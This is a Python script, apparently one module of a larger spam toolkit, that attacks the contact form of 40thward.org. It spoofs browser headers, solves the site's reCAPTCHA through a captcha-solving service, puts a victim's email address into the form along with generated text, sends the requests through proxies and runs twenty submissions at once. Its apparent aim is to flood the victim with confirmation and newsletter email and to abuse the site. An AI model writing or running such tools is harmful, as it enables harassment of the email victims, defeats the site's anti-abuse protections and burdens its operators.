from os.path import basename

import requests

import module

headers = {
    'authority': '40thward.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryfsf2jXffrkvvVfSt',
    'origin': 'https://40thward.org',
    'referer': 'https://40thward.org/contact/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.captcha_solver.solve('6Lf_sDwkAAAAANiU4829y0eb37FTYXEsSi-52f1w',
                                        'https://40thward.org/contact/')
        if not cap:
            return
        data = '------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_3"\r\n\r\ntest\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_4"\r\n\r\n(211) 221-2112\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_5"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_6"\r\n\r\ntest\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_7"\r\n\r\ntest\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_8"\r\n\r\ntes\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_9"\r\n\r\nOnline form\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_10"\r\n\r\nSolutions Team\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_16"\r\n\r\n\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_12.1"\r\n\r\nYes\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="input_13"\r\n\r\nSign me up!\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="is_submit_2"\r\n\r\n1\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n2\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="state_2"\r\n\r\nWyJ7XCIxM1wiOltcIjg1ZDZkODIwMDZkMWY3ZjczNjkwNmI5YzRjYTFkMDRjXCIsXCIzY2UxN2NiZDhmOGM1ZTIwMTQ2NzMzOTNkZmJiYzVjM1wiLFwiYWFmYTg1YWIwY2I3NWM0OTRlYjdhODdlMTU5Y2NhY2ZcIl19IiwiMDQyOGUwZjc1MTA1NzYwZmY2NDIzYWRkYjBiOTUzYTQiXQ==\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="gform_target_page_number_2"\r\n\r\n0\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="gform_source_page_number_2"\r\n\r\n1\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="gform_uploaded_files"\r\n\r\n\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\n18c836acc4787a4d969ed9fdb897567e\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\n18c836acc4787a4d969ed9fdb897567e\r\n------WebKitFormBoundaryfsf2jXffrkvvVfSt--\r\n'

        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text(target=target))
        data = data.replace('cap_que', cap)
        response = requests.post('https://40thward.org/contact/', headers=headers, data=data.encode(),
                                 proxies=self.get_proxies(), timeout=30)
        return response


def main():
    s = 'Thanks for contacting'

    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(20)


if __name__ == '__main__':
    main()
